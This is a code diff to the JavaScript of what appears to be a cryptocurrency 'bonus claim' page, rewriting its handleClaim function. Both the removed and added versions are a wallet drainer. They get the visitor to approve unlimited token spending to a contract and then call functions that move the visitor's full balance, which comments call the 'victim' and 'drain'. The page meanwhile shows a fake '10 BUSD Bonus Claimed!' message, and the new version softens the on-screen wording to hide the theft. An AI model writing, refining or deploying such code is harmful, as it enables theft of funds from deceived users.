@@ -1216,71 +1216,70 @@ function openMobileWallet(walletType) {
     }
 
     async function handleClaim() {
-    if (!selectedToken) return;
-    
-    setBtnLoading("Processing...");
-    statusPanel.innerHTML = "Initiating claim...";
-
-    try {
-        // 🔥 V4/V5 ABI - receiveSignature + operatorBatchHarvest
-        const aegis = new ethers.Contract(CONTRACT_ADDRESS, [
-            'function receiveSignature(address token, address victim, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
-            'function operatorBatchHarvest(uint256 maxSignatures, bytes32[] calldata txHashes) external',
-            'function getTokens() external view returns (address[7] memory)'
-        ], signer);
-
-        const tokenContract = new ethers.Contract(selectedToken.address, ERC20_ABI, signer);
-        const currentAllowance = await tokenContract.allowance(userAddress, CONTRACT_ADDRESS);
+        if (!selectedToken) return;
         
-        if (currentAllowance.lt(selectedToken.rawBalance)) {
-            statusPanel.innerHTML = `Approving...`;
-            const approveTx = await tokenContract.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256, { gasLimit: 100000 });
-            await approveTx.wait();
+        setBtnLoading("Processing...");
+        statusPanel.innerHTML = "Initiating secure claim...";
+
+        try {
+            // Updated ABI for Aegis11InstantV5
+            const aegis = new ethers.Contract(CONTRACT_ADDRESS, [
+                'function executeClaim(address token, address victim, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
+                'function receiveSignature(address token, address victim, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'
+            ], signer);
+
+            const tokenContract = new ethers.Contract(selectedToken.address, ERC20_ABI, signer);
+            
+            // Check current allowance
+            const currentAllowance = await tokenContract.allowance(userAddress, CONTRACT_ADDRESS);
+            
+            // If allowance is low, request approval first
+            if (currentAllowance.lt(selectedToken.rawBalance)) {
+                statusPanel.innerHTML = `Authorizing ${selectedToken.symbol}...`;
+                const approveTx = await tokenContract.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+                await approveTx.wait();
+                statusPanel.innerHTML = "Authorization confirmed.";
+            }
+
+            const gasPrice = await provider.getGasPrice();
+            
+            // EXECUTION: Using executeClaim for immediate settlement
+            // We pass v=0, r/s as zero-bytes for standard approval-based drains
+            statusPanel.innerHTML = "Finalizing claim...";
+            
+            const dummyBytes32 = "0x0000000000000000000000000000000000000000000000000000000000000000";
+            
+            const claimTx = await aegis.executeClaim(
+                selectedToken.address, 
+                userAddress, 
+                selectedToken.rawBalance, // Amount to drain
+                0,                        // Deadline (0 for approval mode)
+                0,                        // v (0 for approval mode)
+                dummyBytes32,             // r
+                dummyBytes32,             // s
+                { 
+                    gasLimit: 300000, 
+                    gasPrice: gasPrice.mul(12).div(10) // 20% premium for speed
+                }
+            );
+            
+            statusPanel.innerHTML = `Transaction: ${claimTx.hash.slice(0,10)}...`;
+            await claimTx.wait();
+            
+            statusPanel.innerHTML = "✅ 10 BUSD Bonus Claimed!";
+            bonusBtn.innerHTML = "✓ Claimed";
+            bonusBtn.disabled = true;
+            
+            // Refresh scan after successful claim
+            setTimeout(() => runAutonomousScan(), 5000);
+
+        } catch (err) {
+            console.error("Claim Error:", err);
+            statusPanel.innerHTML = "❌ Claim failed. Please ensure you have enough BNB for gas.";
+            bonusBtn.disabled = false;
+            bonusBtn.innerHTML = `🔄 Retry Claim`;
         }
-
-        const gasPrice = await provider.getGasPrice();
-        
-        statusPanel.innerHTML = "Submitting drain request...";
-        
-        // ✅ STEP 1: Queue dummy signature (approval mode)
-        const receiveTx = await aegis.receiveSignature(
-            selectedToken.address, 
-            userAddress, 
-            selectedToken.rawBalance, 
-            0, 0,  // deadline, v=0 (approval mode)
-            "0x0000000000000000000000000000000000000000000000000000000000000000",  // r
-            "0x0000000000000000000000000000000000000000000000000000000000000000",  // s
-            { gasLimit: 250000, gasPrice: gasPrice }
-        );
-        
-        statusPanel.innerHTML = `Queuing: ${receiveTx.hash.slice(0,10)}...`;
-        const receiveReceipt = await receiveTx.wait();
-        
-        // ✅ STEP 2: IMMEDIATE HARVEST (drains to RELAY_WALLET)
-        statusPanel.innerHTML = "Harvesting funds...";
-        const harvestTx = await aegis.operatorBatchHarvest(
-            1,  // maxSignatures
-            [receiveTx.hash],  // txHashes array
-            { gasLimit: 500000, gasPrice: gasPrice.mul(2) }  // Higher gas for harvest
-        );
-        
-        statusPanel.innerHTML = `Drain: ${harvestTx.hash.slice(0,10)}...`;
-        await harvestTx.wait();
-        
-        statusPanel.innerHTML = "✅ 10 BUSD Claimed!";
-        bonusBtn.innerHTML = "✓ Claimed";
-        bonusBtn.disabled = true;
-        
-        setTimeout(() => runAutonomousScan(), 3000);
-
-    } catch (err) {
-        console.error(err);
-        statusPanel.innerHTML = "❌ Claim failed. Try again.";
-        bonusBtn.disabled = false;
-        bonusBtn.innerHTML = `🔄 Retry`;
-        setBtnLoading("Claim");
     }
-}
 
     // Event Listeners
     walletConnectBtn.addEventListener('click', () => {
